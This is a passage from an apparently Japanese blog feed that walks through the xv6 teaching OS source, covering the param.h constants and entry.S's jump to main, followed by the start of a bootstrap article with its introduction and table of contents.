&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NPROC&lt;/span&gt;        &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;64&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// maximum number of processes&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;KSTACKSIZE&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;4096&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// size of per-process kernel stack&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NCPU&lt;/span&gt;          &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;8&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// maximum number of CPUs&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NOFILE&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;16&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// open files per process&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NFILE&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;100&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// open files per system&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NINODE&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;50&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// maximum number of active i-nodes&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NDEV&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// maximum major device number&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;ROOTDEV&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// device number of file system root disk&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MAXARG&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;32&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// max exec arguments&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;MAXOPBLOCKS&lt;/span&gt;  &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;10&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// max # of blocks any FS op writes&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;LOGSIZE&lt;/span&gt;      &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MAXOPBLOCKS&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// max data blocks in on-disk log&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;NBUF&lt;/span&gt;         &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;MAXOPBLOCKS&lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token number&quot;&gt;3&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// size of disk block cache&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt;&lt;span class=&quot;token directive keyword&quot;&gt;define&lt;/span&gt; &lt;span class=&quot;token macro-name&quot;&gt;FSSIZE&lt;/span&gt;       &lt;span class=&quot;token expression&quot;&gt;&lt;span class=&quot;token number&quot;&gt;1000&lt;/span&gt;  &lt;/span&gt;&lt;span class=&quot;token comment&quot;&gt;// size of file system in blocks&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Cのコードに移行するためにスタックポインタの設定が必要なのですが、ここは正直よくわかりませんでした。&lt;/p&gt;
&lt;p&gt;というのも、変数&lt;code class=&quot;language-text&quot;&gt;stack&lt;/code&gt;は、&lt;code class=&quot;language-text&quot;&gt;main.c&lt;/code&gt;で定義されているものであり、この時点ではまだ値が格納されていません。&lt;/p&gt;
&lt;p&gt;結果として&lt;code class=&quot;language-text&quot;&gt;.comm&lt;/code&gt;シンボルとして定義され、あとで再定義される想定とされているようです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://stackoverflow.com/questions/29008035/assembly-mov-unitialized-variable&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;c - assembly - mov unitialized variable? - Stack Overflow&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;難解ですね。。&lt;/p&gt;
&lt;h3 id=&quot;main関数に移行&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#main%E9%96%A2%E6%95%B0%E3%81%AB%E7%A7%BB%E8%A1%8C&quot; aria-label=&quot;main関数に移行 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;main関数に移行&lt;/h3&gt;
&lt;p&gt;ブートストラップから続く一連の処理がようやく終わり、ここからカーネル本体となる&lt;code class=&quot;language-text&quot;&gt;main.c&lt;/code&gt;の関数に移行していきます。&lt;/p&gt;
&lt;div class=&quot;gatsby-highlight&quot; data-language=&quot;c&quot;&gt;&lt;pre class=&quot;language-c&quot;&gt;&lt;code class=&quot;language-c&quot;&gt;&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;Jump to &lt;span class=&quot;token function&quot;&gt;main&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; and &lt;span class=&quot;token keyword&quot;&gt;switch&lt;/span&gt; to executing at&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;token directive keyword&quot;&gt;high&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;addresses&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt; The indirect call is needed because&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;token directive keyword&quot;&gt;the&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;assembler produces a PC&lt;span class=&quot;token operator&quot;&gt;-&lt;/span&gt;relative instruction&lt;/span&gt;&lt;/span&gt;
&lt;span class=&quot;token macro property&quot;&gt;&lt;span class=&quot;token directive-hash&quot;&gt;#&lt;/span&gt; &lt;span class=&quot;token directive keyword&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;token expression&quot;&gt;a direct jump&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;
mov $main&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; &lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;eax
jmp &lt;span class=&quot;token operator&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;token operator&quot;&gt;%&lt;/span&gt;eax

&lt;span class=&quot;token punctuation&quot;&gt;.&lt;/span&gt;comm stack&lt;span class=&quot;token punctuation&quot;&gt;,&lt;/span&gt; KSTACKSIZE&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;結構長くなってしまったので続きはまた次回の記事にて。&lt;/p&gt;
&lt;h2 id=&quot;まとめ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot; aria-label=&quot;まとめ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;まとめ&lt;/h2&gt;
&lt;p&gt;今回はカーネルプログラムのビルドとリンカスクリプト、そしてエントリポイントの処理の流れを追っていきました。&lt;/p&gt;
&lt;p&gt;次回は今度こそようやくカーネル本体の動きを追っていくことができそうです。&lt;/p&gt;
&lt;h2 id=&quot;参考書籍&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot; aria-label=&quot;参考書籍 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;参考書籍&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qZSCY7&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;30日でできる! OS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3qXYsZX&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;ゼロからのOS自作入門&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;https://amzn.to/3JRUdI2&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;作って理解するOS x86系コンピュータを動かす理論と実装&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</content:encoded></item><item><title><![CDATA[xv6OSを真面目に読みこんでカーネルを完全に理解する -ブートストラップ編-]]></title><description><![CDATA[教育用OSのxv6OSのソースコードを読んでカーネルについて学んでいきます。この記事ではxv6OSのブートストラップを読み解きます。]]></description><link>https://kashiwaba-yuki.com/unix-xv6-001-bootstrap</link><guid isPermaLink="false">https://kashiwaba-yuki.com/unix-xv6-001-bootstrap</guid><pubDate>Mon, 10 Jan 2022 00:00:00 GMT</pubDate><content:encoded>&lt;p&gt;&lt;a href=&quot;https://amzn.to/3q8TU3K&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;はじめてのOSコードリーディング ~UNIX V6で学ぶカーネルのしくみ&lt;/a&gt;にインスパイアされて&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;を読んでます。&lt;/p&gt;
&lt;p&gt;リバースエンジニアリングに強くなりたいのと、カーネルとかOSに詳しくなりたいと思っています。&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://amzn.to/3I6fkVt&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;詳解 Linuxカーネル&lt;/a&gt;が結構重かったので、もう少し軽めのところから始めたいと思っていたところ、UNIX V6というOSがトータルで1万行くらいのコード量で、人類でもギリギリ理解できるということを知り、興味を持ちました。&lt;/p&gt;
&lt;p&gt;ただ、UNIX V6自体はx86CPUでは動作しないため、基本的には、UNIXv6をX86アーキテクチャで動くようにした&lt;a href=&quot;https://github.com/mit-pdos/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 OS&lt;/a&gt;のリポジトリをForkした&lt;a href=&quot;https://github.com/kash1064/xv6-public&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;kash1064/xv6-public: xv6 OS&lt;/a&gt;のソースコードを読んでいくことにしました。&lt;/p&gt;
&lt;p&gt;xv6は、もともとMITのOSの講義のために開発された教育用のOSです。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2012/xv6.html&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;Xv6, a simple Unix-like teaching operating system&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;この講義で使用するテキストもオンラインで配布されています。&lt;/p&gt;
&lt;p&gt;参考：&lt;a href=&quot;https://pdos.csail.mit.edu/6.828/2012/xv6/book-rev7.pdf&quot; target=&quot;_blank&quot; rel=&quot;nofollow noopener noreferrer&quot;&gt;xv6 a simple, Unix-like teaching operating system&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Fork元のリポジトリは現在メンテナンスされておらず、RISC-Vで動作するUNIXv6のメンテナンスが行われています。&lt;/p&gt;
&lt;!-- omit in toc --&gt;
&lt;h2 id=&quot;もくじ&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%82%E3%81%8F%E3%81%98&quot; aria-label=&quot;もくじ permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;もくじ&lt;/h2&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E6%A7%8B%E9%80%A0&quot;&gt;イメージファイルの構造&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#xv6img&quot;&gt;xv6.img&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#fsimg&quot;&gt;fs.img&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;a href=&quot;#bootblock%E3%82%92%E8%AA%AD%E3%82%80&quot;&gt;bootblockを読む&lt;/a&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%B3%E3%83%B3%E3%83%91%E3%82%A4%E3%83%A9&quot;&gt;コンパイラ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%A1%E3%83%A2%E4%BD%8D%E7%BD%AE%E7%8B%AC%E7%AB%8B%E3%81%AA%E3%82%B3%E3%83%BC%E3%83%89pic&quot;&gt;メモ：位置独立なコード(PIC)&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bootmainc%E3%81%AE%E5%85%A8%E4%BD%93%E5%83%8F&quot;&gt;bootmain.cの全体像&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bootblocko%E3%81%AE%E5%85%A8%E4%BD%93%E5%83%8F&quot;&gt;bootblock.oの全体像&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%96%E3%83%BC%E3%83%88%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%81%AE%E3%83%AA%E3%83%B3%E3%82%AF&quot;&gt;ブートプログラムのリンク&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A8%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89&quot;&gt;リアルモードとプロテクトモード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%AA%E3%82%A2%E3%83%AB%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A7%E8%B5%B7%E5%8B%95%E3%81%99%E3%82%8B&quot;&gt;リアルモードで起動する&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#cli%E3%81%A8sti%E3%81%A7cpu%E5%89%B2%E8%BE%BC%E3%81%BF%E3%82%92%E7%A6%81%E6%AD%A2&quot;&gt;cliとstiでCPU割込みを禁止&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%BB%E3%82%B0%E3%83%A1%E3%83%B3%E3%83%88%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96&quot;&gt;セグメントレジスタの初期化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#a20-line%E3%81%AE%E6%9C%89%E5%8A%B9%E5%8C%96&quot;&gt;A20 Lineの有効化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89%E3%81%B8%E3%81%AE%E7%A7%BB%E8%A1%8C&quot;&gt;プロテクトモードへの移行&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89%E3%81%A7%E3%81%AE%E3%83%A1%E3%83%A2%E3%83%AA%E3%82%A2%E3%83%89%E3%83%AC%E3%82%B9%E5%8F%82%E7%85%A7&quot;&gt;プロテクトモードでのメモリアドレス参照&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#lgdt-gdtdesc&quot;&gt;lgdt gdtdesc&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#32bit%E3%83%A2%E3%83%BC%E3%83%89%E3%81%AE%E9%96%8B%E5%A7%8B&quot;&gt;32bitモードの開始&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%AA%E3%81%9Cljmp%E5%91%BD%E4%BB%A4%E3%82%92%E4%BD%BF%E7%94%A8%E3%81%99%E3%82%8B%E3%81%AE%E3%81%8B&quot;&gt;なぜljmp命令を使用するのか&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%83%86%E3%82%AF%E3%83%88%E3%83%A2%E3%83%BC%E3%83%89%E7%A7%BB%E8%A1%8C%E5%BE%8C%E3%81%AE%E8%A8%AD%E5%AE%9A&quot;&gt;プロテクトモード移行後の設定&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%BB%E3%82%B0%E3%83%A1%E3%83%B3%E3%83%88%E3%83%AC%E3%82%B8%E3%82%B9%E3%82%BF%E3%81%AE%E5%88%9D%E6%9C%9F%E5%8C%96-1&quot;&gt;セグメントレジスタの初期化&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#bootmainc%E3%81%AE%E5%91%BC%E3%81%B3%E5%87%BA%E3%81%97&quot;&gt;bootmain.cの呼び出し&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E3%83%AD%E3%83%BC%E3%83%89&quot;&gt;カーネルのロード&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%81%8B%E3%82%89elf%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%82%92%E3%83%AD%E3%83%BC%E3%83%89%E3%81%99%E3%82%8B&quot;&gt;ディスクからELFカーネルイメージをロードする&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%87%E3%82%A3%E3%82%B9%E3%82%AF%E3%81%8B%E3%82%89%E3%82%BB%E3%82%AF%E3%82%BF%E3%82%92%E8%AA%AD%E3%81%BF%E5%8F%96%E3%82%8B&quot;&gt;ディスクからセクタを読み取る&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%82%93%E3%81%A0%E3%82%AB%E3%83%BC%E3%83%8D%E3%83%AB%E3%81%AE%E7%A2%BA%E8%AA%8D&quot;&gt;読み込んだカーネルの確認&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%83%97%E3%83%AD%E3%82%B0%E3%83%A9%E3%83%A0%E3%83%98%E3%83%83%E3%83%80%E3%81%AE%E8%AA%AD%E3%81%BF%E8%BE%BC%E3%81%BF&quot;&gt;プログラムヘッダの読み込み&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E3%81%BE%E3%81%A8%E3%82%81&quot;&gt;まとめ&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&quot;#%E5%8F%82%E8%80%83%E6%9B%B8%E7%B1%8D&quot;&gt;参考書籍&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&quot;イメージファイルの構造&quot; style=&quot;position:relative;&quot;&gt;&lt;a href=&quot;#%E3%82%A4%E3%83%A1%E3%83%BC%E3%82%B8%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB%E3%81%AE%E6%A7%8B%E9%80%A0&quot; aria-label=&quot;イメージファイルの構造 permalink&quot; class=&quot;anchor before&quot;&gt;&lt;svg aria-hidden=&quot;true&quot; focusable=&quot;false&quot; height=&quot;16&quot; version=&quot;1.1&quot; viewBox=&quot;0 0 16 16&quot; width=&quot;16&quot;&gt;&lt;path fill-rule=&quot;evenodd&quot; d=&quot;M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z&quot;&gt;&lt;/path&gt;&lt;/svg&gt;&lt;/a&gt;イメージファイルの構造&lt;/h2&gt;
&lt;p&gt;xv6は、&lt;code class=&quot;language-text&quot;&gt;xv6.img&lt;/code&gt;と&lt;code class=&quot;language-text&quot;&gt;fs.img&lt;/code&gt;という2つのイメージファイルを使用して起動します。&lt;/p&gt;
